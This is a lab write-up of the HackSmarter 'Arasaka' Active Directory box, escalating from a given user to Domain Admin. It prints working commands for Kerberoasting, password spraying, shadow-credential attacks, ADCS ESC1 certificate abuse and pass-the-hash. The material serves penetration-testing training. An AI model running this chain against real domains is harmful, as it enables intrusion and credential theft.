# [HackSmarter.org - Arasaka](https://www.hacksmarter.org/courses/f618f837-3060-40a3-81cf-31beeaadf37a/take)

![98eae30fe38789f8f28334872f8c92cd.png](/resources/98eae30fe38789f8f28334872f8c92cd.png)

## Table of Contents

- [Abstract](#abstract)
- [Scope and Objective](#scope-and-objective)
- [Enumeration](#enumeration)
- [Kerberoasting alt.svc user](#kerberoasting-altsvc-user)
- [Shadow Credential Attack to Yorinobu user](#shadow-credential-attack-to-yorinobu-user)
- [Shadow Credential Attack to Soulkiller.svc user](#shadow-credential-attack-to-soulkillersvc-user)
- [ESC1 to Domain Admins](#esc1-to-domain-admins)

***
## Abstract 
Arasaka is an Easy Windows Active Directory machine where we are provided with a valid domain user credential in an assumed breach scenario to pentesting Windows Active Directory that also have Certification Service installed and operating. 

With valid user credential, Kerberoasting attack can be used to crack and obtain the cleartext password of "alt.svc" user, this user have "GenericAll" right over "Yorinobu" user and with ADCS installed, we can either change password of this user or use shadow credential attack to obtain NTLM hash of this user.

The "Yorinobu" user have "GenericWrite" right over "Soulkiller.svc" which mean we can also use Shadow Credential attack against this user to obtain its NTLM hash.

Lastly, the "Soulkiller.svc" can enroll "AI_Takeover" certification template which have Enrollee Suppiles Subject flag enabled and does not need manager approval which mean it is vulnerable to ADCS ESC1 which we can specify arbitrary SAN in the certificate and retrieve certificate for "the_emperor" user which is a member of "domain admins" group and finally obtain its NTLM hash to "pass-the-hash" attack and root the machine. 

## Scope and Objective
**Starting Credentials**
```
faraday:hacksmarter123
```

**Objective and Scope**
You are a member of the Hack Smarter Red Team. This penetration test will operate under an assumed breach scenario, starting with valid credentials for a standard domain user, `faraday`.

The primary goal is to simulate a realistic attack, identifying and exploiting vulnerabilities to escalate privileges from a standard user to a Domain Administrator.

## Enumeration

I will start with rustscan since it is faster than nmap and VPN connection can tolerate this much of traffic unlike HTB. (I could not use rustscan could not be used on HTB) and we can see a lot of port opening on this machine as expected since this is the domain controller
```
rustscan -a $IP -- -A
```
![8865d8fca7eda54dea0dbb931dd3eb13.png](/resources/8865d8fca7eda54dea0dbb931dd3eb13.png)

Beside that, we can also see that SSL cert was issued by "hacksmarter-DC01-CA" which mean this domain have Certificate Services installed and running which we can also obtain "DC01.hacksmarter.local", "hacksmarter.local" and "DC01" to map with the IP address in our hosts file

![1b907ed8c31e002821b98152588f54c7.png](/resources/1b907ed8c31e002821b98152588f54c7.png)
![b55e64acf778945ebe0d5da5f872e087.png](/resources/b55e64acf778945ebe0d5da5f872e087.png)

To check the validity of the provided credential, I use NetExec to authenticate to the domain controller via SMB protocol and we can see that this credential is indeed valid.

```
uv run nxc smb hacksmarter.local -u faraday -p hacksmarter123
```
![d0aa7f904a3693a5fd0da7e5a797e53c.png](/resources/d0aa7f904a3693a5fd0da7e5a797e53c.png)

When it comes to domain, ACL abuse is one of the most common privilege escalation vector to be considered so I use rusthound to retrieve domain information and that can be used to visualize the dangerous relationship between each domain object on the bloodhound.

```
rusthound-ce -d hacksmarter.local -u faraday -p hacksmarter123 -z
```
![fe72bc79796c9c10525d1256293d0741.png](/resources/fe72bc79796c9c10525d1256293d0741.png)

I will also pull a valid domain user list to a new text file first so if I obtained a new hash or a password then I can only spray on the valid domain user which we can see that there are 4 accounts with `.svc` which indicates that the usage of them (service account) so kerberoasting attack could be used to retrieve encrypted ticket and if we are lucky then we should be able to retrieve one of service account password here. and we can also see the description of "Soulkiller.svc" account which indicates that it might have some special privilege over certain certificate template on this domain.

```
uv run nxc ldap hacksmarter.local -u faraday -p hacksmarter123 --users-export user.txt
```
![def2510f87caef60ddb38123a7ca2e07.png](/resources/def2510f87caef60ddb38123a7ca2e07.png)

## Kerberoasting alt.svc user

With valid domain credential, now we can conduct kerberoasting attack we are able to retrieve encrypted ticket of "alt.svc" user to crack.

```
uv run nxc ldap hacksmarter.local -u faraday -p hacksmarter123 --kerberoast krbroast.txt
```
![8c295f75799dcbce1ec7c9eaaa21600a.png](/resources/8c295f75799dcbce1ec7c9eaaa21600a.png)

Using `rockyou.txt`, the password is cracked in instant which reveals "babygirl1" of this service user.

![958bb0228356d4e16bb61537761dcba6.png](/resources/958bb0228356d4e16bb61537761dcba6.png)

After obtaining a password, I sprayed it to all valid domain user to see if I have access to more account and look like this password only valid for "alt.svc" user

```
uv run nxc smb hacksmarter.local -u user.txt -p 'babygirl1' --continue-on-success
```
![eab7e609c6432c46b33c66317146d3a3.png](/resources/eab7e609c6432c46b33c66317146d3a3.png)

## Shadow Credential Attack to Yorinobu user

By looking at the bloodhound, we can see that "alt.svc" user have "GenericAll" right over "Yorinobu" user where we can either change password of this user, conduct targeted kerberoasting attack or Shadow credential attack (ADCS installed).

![5793b9e44de467b24ab6cb1a65cc9436.png](/resources/5793b9e44de467b24ab6cb1a65cc9436.png)

Since shadow credential is more stealthy which not mess with the password of user, I went with this attack via certipy, this tool will automatically add Key Credential to "Yorinobu" user then get TGT and use that to retrieve NT hash of this user.

```
certipy-ad shadow auto -u alt.svc@hacksmarter.local -p babygirl1 -account Yorinobu
```
![d6ea78301444ab2a39ee5eff6c900c28.png](/resources/d6ea78301444ab2a39ee5eff6c900c28.png)

## Shadow Credential Attack to Soulkiller.svc user

The "Yorinobu" user has "GenericWrite" right over "Soulkiller.svc" user which mean we can also conduct shadow credential attack against this user as well.

![4d2a369d9eb5a369576f1e0d0d55431e.png](/resources/4d2a369d9eb5a369576f1e0d0d55431e.png)

```
certipy-ad shadow auto -u Yorinobu@hacksmarter.local -hashes 5d21eb21b243284ed2cd8d04ac187c0f -account Soulkiller.svc
```
![963b18cbf434ce58c6ce05d88b083100.png](/resources/963b18cbf434ce58c6ce05d88b083100.png)

## ESC1 to Domain Admins

And as we already expected that the "Soulkiller.svc" can enroll one of certificate template and that template is "AI_TAKEOVER" template which have Enrollee Suppiles Subject flag enabled and does not need manager approval for enrollment. Which is this certificate is indeed vulnerable to ADCS ESC1 where we can supply arbritrary SAN value (targeting high privilege user) in the certificate and then use that certificate to retrieve NT hash of user we want.

![7182bd19522f4d352ad9f836a6c4c8cc.png](/resources/7182bd19522f4d352ad9f836a6c4c8cc.png)

We can use certipy to confirm that this certificate template is really vulnerable to ESC1 from "Soulkiller.svc" user

```
certipy-ad find -u 'Soulkiller.svc@hacksmarter.local' -hashes f4ab68f27303bcb4024650d8fc5f973a -stdout -vulnerable
```
![d2b0aade44aff8885582dda9349e9778.png](/resources/d2b0aade44aff8885582dda9349e9778.png)

Now it is time to pick the target, there are 2 domain controllers on the domain and normally I would go with the administrator account.

![0cdc1ac0352ee53a59f3d3c6f4054393.png](/resources/0cdc1ac0352ee53a59f3d3c6f4054393.png)

But after attacking administrator user, certipy could not get TGT of this user in because of the "Password has expired" status so we will change our target to "the_emperor"

![c13ed07348b78bbfe9d4cc5bafea4f00.png](/resources/c13ed07348b78bbfe9d4cc5bafea4f00.png)

First, I will have to request a certificate and specify upn of "the_emperor" user in SAN, and by having SID supplied, we can reduce the risk of mapping error as well. which we can see that we successfully requested certificate of "the_emplorer" user.

```
certipy req -u 'Soulkiller.svc@hacksmarter.local' -hashes f4ab68f27303bcb4024650d8fc5f973a -target 'hacksmarter.local' -ca 'hacksmarter-DC01-CA' -template 'AI_Takeover' -upn 'the_emperor@hacksmarter.local' -sid 'S-1-5-21-3154413470-3340737026-2748725799-1601'
```
![18c4f327f9aee254422a763c1cd1edce.png](/resources/18c4f327f9aee254422a763c1cd1edce.png)

Using the certificate we just obtained, we can now use that to authenticate to the domain controller again to get TGT which certipy will automatically retrieve NT hash for us.

```
certipy auth -pfx the_emperor.pfx -dc-ip $IP
```
![815393dd08abd837c6ab98f71daf4b37.png](/resources/815393dd08abd837c6ab98f71daf4b37.png)

With NT hash obtained, we can now check its validity via NetExec and as "Pwn3d!" sign imply. we can now root the machine by imply use WinRM or impacket tool to get a shell as SYSTEM.

```
uv run nxc smb hacksmarter.local -u the_emperor -H d87640b0d83dc7f90f5f30bd6789b133
```
![2ccf734a0ad89b053dc7646014165dd0.png](/resources/2ccf734a0ad89b053dc7646014165dd0.png)

After gaining access to the machine as domain admins, we can now loot the root flag located on the Desktop of Administrator user.

```
evil-winrm -i hacksmarter.local -u the_emperor -H d87640b0d83dc7f90f5f30bd6789b133
```
![6d83e82b80edad5bba69c0838b169d67.png](/resources/6d83e82b80edad5bba69c0838b169d67.png)

Full Attack Path can be viewed using built-in "Shortest paths to Domain Admins from Kerberoastable users" cypher query.

![f7eb21cead7afa8f0f9c9452b2bc7c7e.png](/resources/f7eb21cead7afa8f0f9c9452b2bc7c7e.png)

And now we are done :D

***
